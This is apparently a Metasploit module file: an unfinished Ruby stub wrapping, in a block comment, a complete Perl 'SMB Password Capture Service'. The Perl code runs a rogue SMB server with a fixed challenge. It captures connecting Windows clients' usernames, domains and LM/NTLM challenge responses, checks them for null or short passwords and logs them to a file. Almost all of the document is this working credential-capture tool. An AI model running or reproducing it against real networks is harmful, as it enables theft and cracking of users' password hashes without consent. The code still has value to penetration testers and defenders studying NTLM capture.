require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'SMB Password Capture Service',
			'Description'    => %q{
				This module can be used to capture lanman and ntlm password
				hashes from Windows systems.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'MIL', '60'],

				],
			'Privileged'     => false,
			
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'any',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::smb_sniffer;
use base "Msf::Exploit";
use IO::Socket;
use IO::Select;
use Pex::Struct;
use Pex::Text;

use strict;

my $advanced = { };

my $info =
  {
	'Name'    => 'SMB Password Capture Service',
	'Version' => '$Revision$',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>'],

	'Arch'  => [ ],
	'OS'    => [ ],
	'Priv'  => 0,

	'UserOpts'  =>
	  {
		'LHOST'   => [1, 'ADDR', 'The IP address to bind the SMB service to', '0.0.0.0'],
		'LPORT'   => [1, 'PORT', 'The SMB server port', 139],
		'LOGFILE' => [0, 'DATA', 'The path for the optional log file', 'smbsniff.log'],
		'UID'   =>   [0, 'DATA', 'The user ID to switch to after opening the port', 0],
	  },

	'Description'  => Pex::Text::Freeform(qq{
        This module can be used to capture lanman and ntlm password hashes
        from Windows systems.
}),

	'Refs'  =>  [  ['MIL', '60']  ],
	'Keys'  =>  ['smb'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $bind_host = $self->GetVar('LHOST');
	my $bind_port = $self->GetVar('LPORT');

	my $s = IO::Socket::INET->new
	  (
		'LocalAddr'  => $bind_host,
		'LocalPort'  => $bind_port,
		'Listen'     => 5,
		'ReuseAddr'  => 1,
	  );

	if (! $s) {
		$self->PrintLine('[*] Error creating socket: ' . $!);
		return;
	}

	$self->PrintLine("[*] Listener created, switching to userid ".$self->GetVar('UID'));
	$< = $> = $self->GetVar('UID');

	my %state = {};
	$s->blocking(0);
	$s->autoflush(1);

	my $cur = {};
	my $lis = IO::Select->new($s);

	$self->PrintLine("[*] Starting SMB Password Service");

	while (1) {

		my $del = (scalar(keys(%{$cur}))) ? 0.1 : 2;
		my @newc = $lis->can_read($del);
		if (@newc) {
			my $c = $s->accept();
			my $psock = Msf::Socket::Tcp->new_from_socket($c);
			$psock->RecvTimeout(2);
			$psock->RecvLoopTimeout(2);
			$state{$c} =
			  {
				'Status'  => 'new',
				'Socket'  => $psock,
				'SMB'     => Pex::SMB->new({Socket => $psock}),
				'Address' => $c->peerhost,
			  };
			$self->PrintLine('[*] New connection from '.$c->peerhost);
			$cur->{$c} = $c;
		}

		# The IO::Select module does not actually delete
		# handles when you call the remove() method, so we
		# have to use this messy hack to work around a
		# broken core module :(

		my $cli = IO::Select->new();
		foreach (keys(%{$cur})) {
			$cli->add($cur->{$_});
		}

		my @ready = $cli->can_read(1);
		foreach my $c (@ready) {
			$self->Process($state{$c});
			if ($state{$c}->{'Status'} eq 'done' || ! $c->connected) {
				$self->Report($state{$c});
				$state{$c}->{'Socket'}->Close;
				delete($cur->{$c});
				delete($state{$c});
			}
		}
	}

	$s->shutdown(2);
	$s->close;
}

sub Process {
	my $self  = shift;
	my $state = shift;
	my $data  = $state->{'SMB'}->SMBRecv();
	my $sock  = $state->{'Socket'};
	my $stat  = $state->{'Status'};

	if (! $data) {
		$state->{'Status'} = 'done';
		return;
	}

	$state->{'RawData'} = $data;

	# NetBIOS Session Request
	if ($stat eq 'new') {
		if (unpack('C', $data) == 0x81) {
			$sock->Send("\x82\x00\x00\x00");
			$self->NBSessionParse($state, $data);
			$state->{'Status'} = 'negot';
			return;
		}
		return;
	}

	my $smbh = $self->SMBHeaderParse(substr($data, 4));

	# SMB Negotiate
	if ($smbh->Get('command') == 0x72) {
		my %dialects = $self->SMBNegotiateParse($smbh->Get('request'));
		my $pdialect = 'LANMAN2.1';
		if (! exists($dialects{$pdialect})) {
			$self->PrintLine("[*] Host ".$sock->PeerAddr." does not support our dialect: $pdialect");
			return;
		}

		# This routine takes state, dialect, challenge, workgroup, server
		my $res = $self->SMBNegotiateResponseNTLMv1($state, $smbh, $dialects{$pdialect});
		$sock->Send($res);
		$state->{'Status'} = 'setup';
		return;
	}

	# SMB SessionSetupAndX
	if ($smbh->Get('command') == 0x73) {
		my $res = $self->SMBSessionSetupAndXParse($state, $smbh);
		$sock->Send($res);
		return;
	}

	# SMB TreeConnectAndX
	if ($smbh->Get('command') == 0x75) {
		my $res = $self->SMBTreeAndXParse($state);
		$sock->Send($res);
		return;
	}

	# close client connection if we fall through
	$state->{'Status'} = 'done';
}

# Store the netbios names sent during the SMB session request
sub NBSessionParse {
	my $self  = shift;
	my $state = shift;
	my $data  = shift;

	$data = substr($data, 4);
	$data =~ s/ //g;

	my ($called, $caller) = split(/\x00/, $data);
	$state->{'NBCaller'} = Pex::SMB->NBNameDecode($caller);
	$state->{'NBCalled'} = Pex::SMB->NBNameDecode($called);
}

sub SMBHeader {
	my $self = shift;
	my $STSMB = Pex::Struct->new
	  ([
			'smbmagic'      => 'b_u_32',
			'command'       => 'u_8',
			'status'        => 'l_u_32',
			'flags1'        => 'u_8',
			'flags2'        => 'l_u_16',
			'pid_high'      => 'l_u_16',
			'signature1'    => 'l_u_32',
			'signature2'    => 'l_u_32',
			'reserved2'     => 'l_u_16',
			'tree_id'       => 'l_u_16',
			'process_id'    => 'l_u_16',
			'user_id',      => 'l_u_16',
			'multiplex_id'  => 'l_u_16',
			'request'       => 'string',
		]);
	$STSMB->Set
	  (
		'smbmagic'      => 0xff534d42, # \xffSMB
		'command'       => 0,
		'status'        => 0,
		'flags1'        => 0x88,
		'flags2'        => 0x4001,
		'pid_high'      => 0,
		'signature1'    => 0,
		'signature2'    => 0,
		'reserved2'     => 0,
		'tree_id'       => 0,
		'process_id'    => $$,
		'user_id'       => 0,
		'multiplex_id'  => 1,
		'request'       => '',
	  );
	return $STSMB;
}

sub SMBNegotiateParse {
	my $self = shift;
	my $data = shift;
	my $idx = 0;
	my %res;
	foreach (split(/\x02/, $data)) {
		s/\x00//g;
		$res{$_} = $idx++;
	}
	return %res;
}

sub SMBHeaderParse {
	my $self = shift;
	my $data = shift;

	my $STSMB = $self->SMBHeader();
	$STSMB->Fill($data);
	$STSMB->Set('request' => substr($data, $STSMB->Length));
	return $STSMB;
}

sub SMBNegotiateResponseNTLMv1 {
	my $self  = shift;
	my $state = shift;
	my $smbh  = shift;
	my $dial  = shift;
	my $chall = @_ ? shift() : ("\x41" x 8);
	my $group = @_ ? shift() : $state->{'NBCaller'};
	my $mach  = @_ ? shift() : $state->{'NBCaller'};

	$group =~ s/\x00|\s+$//g;
	$mach =~ s/\x00|\s+$//g;

	my $STNegResNT = Pex::Struct->new
	  ([
			'word_count'    => 'u_8',
			'dialect'       => 'l_u_16',
			'sec_mode'      => 'u_8',
			'max_mpx'       => 'l_u_16',
			'max_vcs'       => 'l_u_16',
			'max_buff'      => 'l_u_32',
			'max_raw'       => 'l_u_32',
			'sess_key'      => 'l_u_32',
			'caps'          => 'l_u_32',
			'dos_time'      => 'l_u_32',
			'dos_date'      => 'l_u_32',
			'time_zone'     => 'l_u_16',
			'key_len'       => 'u_8',
			'bcc_len'       => 'l_u_16',
			'enc_key'       => 'string',
			'domain'        => 'string',
			'machine'       => 'string',

		]);
	$STNegResNT->SetSizeField( 'enc_key' => 'key_len' );
	$STNegResNT->Set
	  (
		'word_count'    => 17,
		'dialect'       => $dial,
		'sec_mode'      => 3,
		'max_mpx'       => 50,
		'max_vcs'       => 1,
		'max_buff'      => 16644,
		'max_raw'       => 65536,
		'sess_key'      => rand() * 0xffff,
		'caps'          => 0xe3f9,
		'dos_time'      => 0xbdc64e00,
		'dos_date'      => 0x01c46660,
		'time_zone'     => 300,
		'key_len'       => length($chall),
		'bcc_len'       => length($chall)+length($group)+1+length($mach)+1,
		'enc_key'       => $chall,
		'domain'        => $group."\x00",
		'machine'       => $mach. "\x00",
	  );

	my $STSMB = $self->SMBHeader();
	$STSMB->Set(
		'command' => 0x72,
		'flags2'  => 0x0001,
		'request' => $STNegResNT->Fetch,
		'multiplex_id'  => $smbh->Get('multiplex_id'),
		'process_id'    => $smbh->Get('process_id'),
	  );

	$state->{'Challenge'} = $chall;
	return "\x00\x00".pack('n', $STSMB->Length).$STSMB->Fetch;
}

sub SMBSessionSetupAndXParse {
	my $self  = shift;
	my $state = shift;
	my $smbh  = shift;
	my $data  = $smbh->Get('request');
	my $res;

	# report each authentication attempt
	delete($state->{'Reported'});

	my $STSetupXNT = Pex::Struct->new
	  ([
			'word_count'    => 'u_8',
			'x_cmd'         => 'u_8',
			'reserved1'     => 'u_8',
			'x_off'         => 'l_u_16',
			'max_buff'      => 'l_u_16',
			'max_mpx'       => 'l_u_16',
			'vc_num'        => 'l_u_16',
			'sess_key'      => 'l_u_32',
			'pass_len_lm'   => 'l_u_16',
			'pass_len_nt'   => 'l_u_16',
			'reserved2'     => 'l_u_32',
			'caps'          => 'l_u_32',
			'bcc_len'       => 'l_u_16',
			'request'       => 'string',
		]);
	$STSetupXNT->SetSizeField( 'request' => 'bcc_len' );
	$STSetupXNT->Fill($data);

	# print Pex::Text::BufferPerl($STSetupXNT->Fetch);

	my $info = $STSetupXNT->Get('request');
	my ($pwlm, $pwnt, $user, $domain, $os, $lm);

	$pwlm = $pwnt = ("\x00" x 24);

	if ($STSetupXNT->Get('pass_len_lm') > 0) {
		$pwlm = substr($info, 0, $STSetupXNT->Get('pass_len_lm'));
		$info = substr($info, $STSetupXNT->Get('pass_len_lm'));
	}
	if ($STSetupXNT->Get('pass_len_nt') > 0) {
		$pwnt = substr($info, 0, $STSetupXNT->Get('pass_len_nt'));
		$info = substr($info, $STSetupXNT->Get('pass_len_nt'));
	}

	# assume the client respected our no unicode flag
	($user, $domain, $os, $lm) = split(/\x00/, $info);

	# $self->PrintLine("[*] Access from $user\@domain [$os] [$lm]");
	$state->{'Username'}   = $user;
	$state->{'Domain'}     = $domain;
	$state->{'LMPassword'} = $pwlm;
	$state->{'NTPassword'} = $pwnt;
	$state->{'NativeLM'}   = $lm;
	$state->{'NativeOS'}   = $os;
	$self->Report($state);

	my $STSetupXRes;
	my $STSMB;

	# Deny access when a username is specified
	if ($user || ($STSetupXNT->Get('x_cmd') && $state->{'RawData'} !~ /IPC/)) {

		$STSetupXRes = Pex::Struct->new
		  ([
				'word_count'    => 'u_8',
				'bcc_len'       => 'l_u_16',
			]);
		$STSetupXRes->Set
		  (
			'word_count'    => 0,
			'bcc_len'       => 0,
		  );

		$STSMB = $self->SMBHeader();
		$STSMB->Set(
			'command'       => 0x73,
			'request'       => $STSetupXRes->Fetch,
			'status'        => 0xc000006d,
			'multiplex_id'  => $smbh->Get('multiplex_id'),
			'process_id'    => $smbh->Get('process_id'),
		  );
	}

	# Allow anonymous access, this is required for real password theft
	else {

		my $sinfo =
		  "Windows 2000 2195\x00".
		  "Windows 2000 5.0\x00".
		  $state->{'NBCaller'}."\x00";

		$STSetupXRes = Pex::Struct->new
		  ([
				'word_count'    => 'u_8',
				'x_cmd'         => 'u_8',
				'reserved1'     => 'u_8',
				'x_off'         => 'l_u_16',
				'action'        => 'l_u_16',
				'bcc_len'       => 'l_u_16',
				'request'       => 'string',
			]);
		$STSetupXRes->SetSizeField( 'request' => 'bcc_len' );
		$STSetupXRes->Set
		  (
			'word_count'    => 3,
			'x_cmd'         => $STSetupXNT->Get('x_cmd'),
			'reserved1'     => 0,
			'x_off'         => 41 + length($sinfo),
			'action'        => 1,
			'bcc_len'       => length($sinfo),
			'request'       => $sinfo,
		  );

		my $share = ("IPC\x00" x 2);
		my $AndX =
		  "\x03\xff\x00\x00\x00\x01\x00".
		  pack('v', length($share)).
		  $share;

		my $combined = $STSetupXRes->Fetch . $AndX;

		$STSMB = $self->SMBHeader();
		$STSMB->Set(
			'command'       => 0x73,
			'request'       => $combined,
			'tree_id'       => 1,
			'user_id'       => 100,
			'multiplex_id'  => $smbh->Get('multiplex_id'),
			'process_id'    => $smbh->Get('process_id'),
		  );
	}

	return "\x00\x00".pack('n', $STSMB->Length).$STSMB->Fetch;
}

sub SMBTreeAndXParse {
	my $self  = shift;
	my $state = shift;
	my $share = ("IPC\x00" x 2);

	my $res =
	  "\x03\xff\x00\x00\x00\x01\x00".
	  pack('v', length($share)).
	  $share;

	my $STSMB = $self->SMBHeader();
	$STSMB->Set(
		'command' => 0x75,
		'request' => $res,
	  );

	return "\x00\x00".pack('n', $STSMB->Length).$STSMB->Fetch;
}

sub Report {
	my $self  = shift;
	my $state = shift;

	return if exists($state->{'Reported'});

	# Generate all of the common password check hashes
	if (! $self->{'CH'}->{$state->{'Challenge'}}) {
		$self->{'CH'}->{$state->{'Challenge'}} = { };
		my $x = $self->{'CH'}->{$state->{'Challenge'}};
		$x->{'Short'} = substr(Pex::SMB->CryptLM("XXXXXXX", $state->{'Challenge'}), 16, 8);
		$x->{'NullLM'} = Pex::SMB->CryptLM("", $state->{'Challenge'});
		$x->{'NullNT'} = Pex::SMB->CryptNT("", $state->{'Challenge'});
	}
	my $ch = $self->{'CH'}->{$state->{'Challenge'}};

	my $info = '';

	if ($ch->{'Short'} eq substr($state->{'LMPassword'}, 16, 8)) {
		$info .= 'ShortLM ';
	}

	if ($ch->{'NullLM'} eq $state->{'LMPassword'}) {
		$info .= 'NullLM ';
	}

	if ($ch->{'NullNT'} eq $state->{'NTPassword'}) {
		$info .= 'NullNT ';
	}

	my $log =
	  join("\t",
		(
			scalar(localtime()),
			$state->{'Address'},
			$state->{'Username'},
			$state->{'Domain'},
			unpack("H*", $state->{'Challenge'}),
			unpack("H*", $state->{'LMPassword'}),
			unpack("H*", $state->{'NTPassword'}),
			$state->{'NativeOS'},
			$state->{'NativeLM'},
			$info
		  ));
	$self->PrintLine($log);
	$state->{'Reported'}++;

	if ($self->GetVar('LOGFILE') && open(my $out, ">>".$self->GetVar('LOGFILE'))) {
		print $out "$log\n";
		close ($out);
	}
}

1;

=end


end
end	
